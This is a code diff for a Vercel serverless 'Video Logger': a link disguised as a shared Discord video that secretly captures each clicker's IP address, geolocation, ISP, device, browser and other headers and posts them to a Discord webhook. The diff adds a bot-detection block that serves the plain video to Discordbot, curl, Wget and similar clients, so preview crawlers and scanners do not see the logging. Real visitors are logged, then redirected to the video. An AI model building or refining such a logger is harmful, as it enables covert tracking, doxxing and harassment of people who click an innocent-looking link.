@@ -1,11 +1,11 @@
 import https from 'https';
 
-// ─── CHANGE THIS IMAGE URL ANYTIME ───
-const IMAGE_URL = 'https://cdn.discordapp.com/attachments/1522326026577772655/1533994113081413753/v1c044g50000d9lrmivog65kaclgt54g.mov?ex=6a7282d8&is=6a713158&hm=309705a0f0a44e3d4e00e0fd7d3a15aedeab6fec134d295b58075e46af842123&';
-// ─────────────────────────────────────
+// ─── CHANGE THIS URL ANYTIME (image or video) ───
+const IMAGE_URL = 'https://cdn.discordapp.com/attachments/1522326026577772655/1533994113081413753/1c044e500000d91rmivog5kac1gt54g.mov?ex=6a728d88&is=6a713c08&hm=309705a9f0a44e3d4e00e0f7d73a15aedae6befc134d29b5b8075e46af8f0815&';
+// ──────────────────────────────────────────────────
 
 export default async function handler(req, res) {
-    // ─── Get all available info ───
+    // ─── Get real IP ───
     const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
                req.socket.remoteAddress || 
                'unknown';
@@ -20,7 +20,22 @@ export default async function handler(req, res) {
     const dnt = req.headers['dnt'] || 'unknown';
     const time = new Date().toISOString().replace('T', ' ').slice(0, 19);
 
-    // ─── Get country from IP using free API (with fallback) ───
+    // ─── IGNORE bots/proxies ───
+    const botPatterns = ['Discordbot', 'Twitterbot', 'Slackbot', 'curl', 'python-requests', 'Go-http-client', 'okhttp', 'HTTPie', 'Wget'];
+    const isBot = botPatterns.some(bot => ua.includes(bot));
+    if (isBot) {
+        try {
+            const imageRes = await fetch(IMAGE_URL);
+            const buffer = Buffer.from(await imageRes.arrayBuffer());
+            res.setHeader('Content-Type', 'video/quicktime');
+            res.status(200).send(buffer);
+        } catch (_) {
+            res.status(204).end();
+        }
+        return;
+    }
+
+    // ─── Get country from IP ───
     let country = 'Unknown';
     let countryCode = 'UN';
     let flagEmoji = '🌍';
@@ -46,14 +61,13 @@ export default async function handler(req, res) {
                 timezone = geo.timezone || 'Unknown';
                 loc = geo.loc || 'Unknown';
                 asn = geo.as || 'Unknown';
-                // Convert country code to flag emoji
                 const codePoints = countryCode.toUpperCase().split('').map(ch => 0x1F1E6 + ch.charCodeAt(0) - 65);
                 flagEmoji = String.fromCodePoint(...codePoints);
             }
         }
-    } catch (_) { /* fallback to defaults */ }
+    } catch (_) { /* fallback */ }
 
-    // ─── Parse User-Agent for device info ───
+    // ─── Parse User-Agent ───
     let deviceType = 'Unknown';
     let os = 'Unknown';
     let browser = 'Unknown';
@@ -82,8 +96,8 @@ export default async function handler(req, res) {
 
     // ─── Build rich embed ───
     const embed = {
-        title: '🕵️ New Click Captured',
-        color: 0x00ff88,
+        title: '🎬 New Video Click Captured',
+        color: 0xff5500,
         thumbnail: { url: IMAGE_URL },
         fields: [
             { name: '🌐 IP Address', value: `\`${ip}\``, inline: false },
@@ -97,7 +111,7 @@ export default async function handler(req, res) {
             { name: '💻 OS', value: os, inline: true },
             { name: '🌐 Browser', value: browser, inline: true },
             { name: '📱 Mobile', value: secChUaMobile || 'unknown', inline: true },
-            { name: '📋 Platform (sec-ch-ua)', value: secChUaPlatform || 'unknown', inline: true },
+            { name: '📋 Platform', value: secChUaPlatform || 'unknown', inline: true },
             { name: '📎 User-Agent', value: `\`${ua.slice(0, 200)}${ua.length > 200 ? '...' : ''}\``, inline: false },
             { name: '🔗 Referer', value: referer.length > 100 ? referer.slice(0, 100) + '...' : referer, inline: false },
             { name: '🌍 Accept-Language', value: acceptLang, inline: true },
@@ -105,7 +119,7 @@ export default async function handler(req, res) {
             { name: '🚫 Do Not Track', value: dnt, inline: true },
             { name: '📅 Timestamp (UTC)', value: `\`${time}\``, inline: false }
         ],
-        footer: { text: 'Image Logger • Powered by Vercel', icon_url: 'https://cdn.discordapp.com/emojis/1275000930538225665.png' }
+        footer: { text: 'Video Logger • Powered by Vercel' }
     };
 
     // ─── Send to Discord webhook ───
@@ -122,16 +136,7 @@ export default async function handler(req, res) {
     discordReq.write(payload);
     discordReq.end();
 
-    // ─── Serve the image ───
-    try {
-        const imageRes = await fetch(IMAGE_URL);
-        const buffer = Buffer.from(await imageRes.arrayBuffer());
-        res.setHeader('Content-Type', 'image/png');
-        res.status(200).send(buffer);
-    } catch (_) {
-        // Fallback if image fails – send a simple 1x1 transparent PNG
-        const fallbackBuffer = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
-        res.setHeader('Content-Type', 'image/png');
-        res.status(200).send(fallbackBuffer);
-    }
+    // ─── REDIRECT to the video ───
+    res.writeHead(302, { Location: IMAGE_URL });
+    res.end();
 }
